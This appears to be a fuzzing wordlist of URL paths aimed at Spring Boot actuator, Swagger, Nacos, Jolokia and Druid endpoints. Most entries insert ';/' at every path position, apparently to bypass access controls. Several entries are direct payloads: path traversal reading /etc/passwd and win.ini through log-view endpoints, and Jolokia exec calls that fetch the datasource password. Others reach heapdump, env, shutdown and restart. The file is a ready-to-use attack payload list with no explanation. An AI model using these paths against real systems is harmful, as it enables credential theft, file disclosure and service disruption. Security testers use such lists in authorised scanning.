;/
/gateway;/actuator/swagger-ui.html
/gateway/actuator;/swagger-ui.html
;/gateway/actuator/threaddump
/gateway;/actuator/threaddump
/gateway/actuator;/threaddump
;/gateway/actuator/trace
/gateway;/actuator/trace
/gateway/actuator;/trace
;/get
;/get?serviceName=springboot2-nacos-discovery
;/h2-console
;/health
;/heapdump
;/heapdump.json
;/httptrace
;/hystrix
;/hystrix.stream
;/info
;/intergrationgraph
;/jolokia
;/jolokia/exec/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager/getProperty/spring.datasource.password
/jolokia;/exec/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager/getProperty/spring.datasource.password
/jolokia/exec;/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager/getProperty/spring.datasource.password
/jolokia/exec/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager;/getProperty/spring.datasource.password
/jolokia/exec/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager/getProperty;/spring.datasource.password
;/jolokia/exec/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager/getProperty/spring.datasource.url
/jolokia;/exec/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager/getProperty/spring.datasource.url
/jolokia/exec;/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager/getProperty/spring.datasource.url
/jolokia/exec/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager;/getProperty/spring.datasource.url
/jolokia/exec/org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager/getProperty;/spring.datasource.url
;/jolokia/list
/jolokia;/list
;/lastn/actuator/sessions
/lastn;/actuator/sessions
/lastn/actuator;/sessions
;/libs/swaggerui
/libs;/swaggerui
;/liquibase
;/log/view?filename=/etc/passwd&base=../../../../../../../../../../
/log;/view?filename=/etc/passwd&base=../../../../../../../../../../
/log/view?filename=;/etc/passwd&base=../../../../../../../../../../
/log/view?filename=/etc;/passwd&base=../../../../../../../../../../
/log/view?filename=/etc/passwd&base=..;/../../../../../../../../../
/log/view?filename=/etc/passwd&base=../..;/../../../../../../../../
/log/view?filename=/etc/passwd&base=../../..;/../../../../../../../
/log/view?filename=/etc/passwd&base=../../../..;/../../../../../../
/log/view?filename=/etc/passwd&base=../../../../..;/../../../../../
/log/view?filename=/etc/passwd&base=../../../../../..;/../../../../
/log/view?filename=/etc/passwd&base=../../../../../../..;/../../../
/log/view?filename=/etc/passwd&base=../../../../../../../..;/../../
/log/view?filename=/etc/passwd&base=../../../../../../../../..;/../
/log/view?filename=/etc/passwd&base=../../../../../../../../../..;/
;/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
/log;/view?filename=/windows/win.ini&base=../../../../../../../../../../
/log/view?filename=;/windows/win.ini&base=../../../../../../../../../../
/log/view?filename=/windows;/win.ini&base=../../../../../../../../../../
/log/view?filename=/windows/win.ini&base=..;/../../../../../../../../../
/log/view?filename=/windows/win.ini&base=../..;/../../../../../../../../
/log/view?filename=/windows/win.ini&base=../../..;/../../../../../../../
/log/view?filename=/windows/win.ini&base=../../../..;/../../../../../../
/log/view?filename=/windows/win.ini&base=../../../../..;/../../../../../
/log/view?filename=/windows/win.ini&base=../../../../../..;/../../../../
/log/view?filename=/windows/win.ini&base=../../../../../../..;/../../../
/log/view?filename=/windows/win.ini&base=../../../../../../../..;/../../
/log/view?filename=/windows/win.ini&base=../../../../../../../../..;/../
/log/view?filename=/windows/win.ini&base=../../../../../../../../../..;/
;/logfile
;/loggers
;/login/admin/swagger-ui.html
/login;/admin/swagger-ui.html
/login/admin;/swagger-ui.html
;/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../
/manage;/log/view?filename=/etc/passwd&base=../../../../../../../../../../
/manage/log;/view?filename=/etc/passwd&base=../../../../../../../../../../
/manage/log/view?filename=;/etc/passwd&base=../../../../../../../../../../
/manage/log/view?filename=/etc;/passwd&base=../../../../../../../../../../
/manage/log/view?filename=/etc/passwd&base=..;/../../../../../../../../../
/manage/log/view?filename=/etc/passwd&base=../..;/../../../../../../../../
/manage/log/view?filename=/etc/passwd&base=../../..;/../../../../../../../
/manage/log/view?filename=/etc/passwd&base=../../../..;/../../../../../../
/manage/log/view?filename=/etc/passwd&base=../../../../..;/../../../../../
/manage/log/view?filename=/etc/passwd&base=../../../../../..;/../../../../
/manage/log/view?filename=/etc/passwd&base=../../../../../../..;/../../../
/manage/log/view?filename=/etc/passwd&base=../../../../../../../..;/../../
/manage/log/view?filename=/etc/passwd&base=../../../../../../../../..;/../
/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../..;/
;/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
/manage;/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
/manage/log;/view?filename=/windows/win.ini&base=../../../../../../../../../../
/manage/log/view?filename=;/windows/win.ini&base=../../../../../../../../../../
/manage/log/view?filename=/windows;/win.ini&base=../../../../../../../../../../
/manage/log/view?filename=/windows/win.ini&base=..;/../../../../../../../../../
/manage/log/view?filename=/windows/win.ini&base=../..;/../../../../../../../../
/manage/log/view?filename=/windows/win.ini&base=../../..;/../../../../../../../
/manage/log/view?filename=/windows/win.ini&base=../../../..;/../../../../../../
/manage/log/view?filename=/windows/win.ini&base=../../../../..;/../../../../../
/manage/log/view?filename=/windows/win.ini&base=../../../../../..;/../../../../
/manage/log/view?filename=/windows/win.ini&base=../../../../../../..;/../../../
/manage/log/view?filename=/windows/win.ini&base=../../../../../../../..;/../../
/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../..;/../
/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../..;/
;/management/heapdump
/management;/heapdump
;/mappings
;/metrics
;/metrics/
/metrics;/
;/metrics/mem
/metrics;/mem
;/metrics/nacos
/metrics;/nacos
;/monitor
;/monitor/auditevents
/monitor;/auditevents
;/monitor/conditions
/monitor;/conditions
;/monitor/env
/monitor;/env
;/monitor/loggers
/monitor;/loggers
;/monitor/mappings
/monitor;/mappings
;/monitor/scheduledtasks
/monitor;/scheduledtasks
;/monitor/threaddump
/monitor;/threaddump
;/nacos
;/nacos/v1/cs/configs
/nacos;/v1/cs/configs
/nacos/v1;/cs/configs
/nacos/v1/cs;/configs
;/nacos/v1/cs/configs?dataId=Misplaced
/nacos;/v1/cs/configs?dataId=Misplaced
/nacos/v1;/cs/configs?dataId=Misplaced
/nacos/v1/cs;/configs?dataId=Misplaced
;/nacos/v1/ns/instance
/nacos;/v1/ns/instance
/nacos/v1;/ns/instance
/nacos/v1/ns;/instance
;/nacos/v1/ns/instance?serviceName=springboot2-nacos-discovery
/nacos;/v1/ns/instance?serviceName=springboot2-nacos-discovery
/nacos/v1;/ns/instance?serviceName=springboot2-nacos-discovery
/nacos/v1/ns;/instance?serviceName=springboot2-nacos-discovery
;/nacos/v2/cs/configs
/nacos;/v2/cs/configs
/nacos/v2;/cs/configs
/nacos/v2/cs;/configs
;/nacos/v2/cs/configs?dataId=Misplaced
/nacos;/v2/cs/configs?dataId=Misplaced
/nacos/v2;/cs/configs?dataId=Misplaced
/nacos/v2/cs;/configs?dataId=Misplaced
;/nacos/v2/ns/instance
/nacos;/v2/ns/instance
/nacos/v2;/ns/instance
/nacos/v2/ns;/instance
;/nacos/v2/ns/instance?serviceName=springboot2-nacos-discovery
/nacos;/v2/ns/instance?serviceName=springboot2-nacos-discovery
/nacos/v2;/ns/instance?serviceName=springboot2-nacos-discovery
/nacos/v2/ns;/instance?serviceName=springboot2-nacos-discovery
;/oauth/authorize/actuator/swagger/index.html
/oauth;/authorize/actuator/swagger/index.html
/oauth/authorize;/actuator/swagger/index.html
/oauth/authorize/actuator;/swagger/index.html
/oauth/authorize/actuator/swagger;/index.html
;/oauth/check_token/actuator/swagger/static/index.html
/oauth;/check_token/actuator/swagger/static/index.html
/oauth/check_token;/actuator/swagger/static/index.html
/oauth/check_token/actuator;/swagger/static/index.html
/oauth/check_token/actuator/swagger;/static/index.html
/oauth/check_token/actuator/swagger/static;/index.html
;/oauth/client/token/api-docs
/oauth;/client/token/api-docs
/oauth/client;/token/api-docs
/oauth/client/token;/api-docs
;/oauth/confirm_access/actuator/system/
/oauth;/confirm_access/actuator/system/
/oauth/confirm_access;/actuator/system/
/oauth/confirm_access/actuator;/system/
/oauth/confirm_access/actuator/system;/
;/oauth/error/actuator/system/env
/oauth;/error/actuator/system/env
/oauth/error;/actuator/system/env
/oauth/error/actuator;/system/env
/oauth/error/actuator/system;/env
;/oauth/get/token/api.html
/oauth;/get/token/api.html
/oauth/get;/token/api.html
/oauth/get/token;/api.html
;/oauth/refresh/token/api/doc
/oauth;/refresh/token/api/doc
/oauth/refresh;/token/api/doc
/oauth/refresh/token;/api/doc
/oauth/refresh/token/api;/doc
;/oauth/remove/token/api/index.html
/oauth;/remove/token/api/index.html
/oauth/remove;/token/api/index.html
/oauth/remove/token;/api/index.html
/oauth/remove/token/api;/index.html
;/oauth/token/actuator/system/mappings
/oauth;/token/actuator/system/mappings
/oauth/token;/actuator/system/mappings
/oauth/token/actuator;/system/mappings
/oauth/token/actuator/system;/mappings
;/oauth/token/list/api/swagger
/oauth;/token/list/api/swagger
/oauth/token;/list/api/swagger
/oauth/token/list;/api/swagger
/oauth/token/list/api;/swagger
;/oauth/user/token/api/swagger-resources
/oauth;/user/token/api/swagger-resources
/oauth/user;/token/api/swagger-resources
/oauth/user/token;/api/swagger-resources
/oauth/user/token/api;/swagger-resources
;/oauth/userinfo/api/swagger-ui.html
/oauth;/userinfo/api/swagger-ui.html
/oauth/userinfo;/api/swagger-ui.html
/oauth/userinfo/api;/swagger-ui.html
;/peripheral/swagger-ui.html
/peripheral;/swagger-ui.html
;/peripheral/v2/api-docs
/peripheral;/v2/api-docs
/peripheral/v2;/api-docs
;/prometheus
;/redis/keysSize/api/swagger/ui
/redis;/keysSize/api/swagger/ui
/redis/keysSize;/api/swagger/ui
/redis/keysSize/api;/swagger/ui
/redis/keysSize/api/swagger;/ui
;/redis/memoryInfo/api/swaggerui
/redis;/memoryInfo/api/swaggerui
/redis/memoryInfo;/api/swaggerui
/redis/memoryInfo/api;/swaggerui
;/refresh
;/restart
;/scheduledtasks
;/services
;/services/1
/services;/1
;/services/api/v2/api-docs
/services;/api/v2/api-docs
/services/api;/v2/api-docs
/services/api/v2;/api-docs
;/services/findAlls/api/v1/api-docs
/services;/findAlls/api/v1/api-docs
/services/findAlls;/api/v1/api-docs
/services/findAlls/api;/v1/api-docs
/services/findAlls/api/v1;/api-docs
;/services/findOnes/api/v1/login
/services;/findOnes/api/v1/login
/services/findOnes;/api/v1/login
/services/findOnes/api;/v1/login
/services/findOnes/api/v1;/login
;/services/granted/api/v1/swagger-resources
/services;/granted/api/v1/swagger-resources
/services/granted;/api/v1/swagger-resources
/services/granted/api;/v1/swagger-resources
/services/granted/api/v1;/swagger-resources
;/services/saveOrUpdate/api/v1/swagger-ui.html
/services;/saveOrUpdate/api/v1/swagger-ui.html
/services/saveOrUpdate;/api/v1/swagger-ui.html
/services/saveOrUpdate/api;/v1/swagger-ui.html
/services/saveOrUpdate/api/v1;/swagger-ui.html
;/sessions
;/shutdown
;/spring-security-oauth-resource/swagger-ui.html
/spring-security-oauth-resource;/swagger-ui.html
;/spring-security-rest/api/swagger-ui.html
/spring-security-rest;/api/swagger-ui.html
/spring-security-rest/api;/swagger-ui.html
;/static/swagger.json
/static;/swagger.json
;/sw/swagger-ui.html
/sw;/swagger-ui.html
;/swagger
;/swagger-dubbo/api-docs
/swagger-dubbo;/api-docs
;/swagger-resources
;/swagger-resources/actuator/shutdown
/swagger-resources;/actuator/shutdown
/swagger-resources/actuator;/shutdown
;/swagger-resources/configuration/security
/swagger-resources;/configuration/security
/swagger-resources/configuration;/security
;/swagger-resources/configuration/security/actuator/spring-security-oauth-resource/swagger-ui.html
/swagger-resources;/configuration/security/actuator/spring-security-oauth-resource/swagger-ui.html
/swagger-resources/configuration;/security/actuator/spring-security-oauth-resource/swagger-ui.html
/swagger-resources/configuration/security;/actuator/spring-security-oauth-resource/swagger-ui.html
/swagger-resources/configuration/security/actuator;/spring-security-oauth-resource/swagger-ui.html
/swagger-resources/configuration/security/actuator/spring-security-oauth-resource;/swagger-ui.html
;/swagger-resources/configuration/ui
/swagger-resources;/configuration/ui
/swagger-resources/configuration;/ui
;/swagger-resources/configuration/ui/actuator/spring-security-rest/api/swagger-ui.html
/swagger-resources;/configuration/ui/actuator/spring-security-rest/api/swagger-ui.html
/swagger-resources/configuration;/ui/actuator/spring-security-rest/api/swagger-ui.html
/swagger-resources/configuration/ui;/actuator/spring-security-rest/api/swagger-ui.html
/swagger-resources/configuration/ui/actuator;/spring-security-rest/api/swagger-ui.html
/swagger-resources/configuration/ui/actuator/spring-security-rest;/api/swagger-ui.html
/swagger-resources/configuration/ui/actuator/spring-security-rest/api;/swagger-ui.html
;/swagger-ui
;/swagger-ui.html
;/swagger-ui.html#
;/swagger-ui.html/api/v2/swagger.json
/swagger-ui.html;/api/v2/swagger.json
/swagger-ui.html/api;/v2/swagger.json
/swagger-ui.html/api/v2;/swagger.json
;/swagger-ui/html
/swagger-ui;/html
;/swagger-ui/index.html
/swagger-ui;/index.html
;/swagger/codes
/swagger;/codes
;/swagger/index.html
/swagger;/index.html
;/swagger/static/index.html
/swagger;/static/index.html
/swagger/static;/index.html
;/swagger/swagger-ui.html
/swagger;/swagger-ui.html
;/swagger/ui
/swagger;/ui
;/swagger/v1/swagger.json
/swagger;/v1/swagger.json
/swagger/v1;/swagger.json
;/swagger/v2/swagger.json
/swagger;/v2/swagger.json
/swagger/v2;/swagger.json
;/system/
/system;/
;/system/druid/index.html
/system;/druid/index.html
/system/druid;/index.html
;/system/env
/system;/env
;/system/mappings
/system;/mappings
;/system/showOsInfo
/system;/showOsInfo
;/system/showProperties
/system;/showProperties
;/template/swagger-ui.html
/template;/swagger-ui.html
;/threaddump
;/trace
;/user/swagger-ui.html
/user;/swagger-ui.html
;/v1.1/swagger-ui.html
/v1.1;/swagger-ui.html
;/v1.2/swagger-ui.html
/v1.2;/swagger-ui.html
;/v1.3/swagger-ui.html
/v1.3;/swagger-ui.html
;/v1.4/swagger-ui.html
/v1.4;/swagger-ui.html
;/v1.5/swagger-ui.html
/v1.5;/swagger-ui.html
;/v1.6/swagger-ui.html
/v1.6;/swagger-ui.html
;/v1.7/swagger-ui.html
/v1.7;/swagger-ui.html
;/v1.8/swagger-ui.html
/v1.8;/swagger-ui.html
;/v1.9/swagger-ui.html
/v1.9;/swagger-ui.html
;/v1/agent/self/actuator/system/showProperties
/v1;/agent/self/actuator/system/showProperties
/v1/agent;/self/actuator/system/showProperties
/v1/agent/self;/actuator/system/showProperties
/v1/agent/self/actuator;/system/showProperties
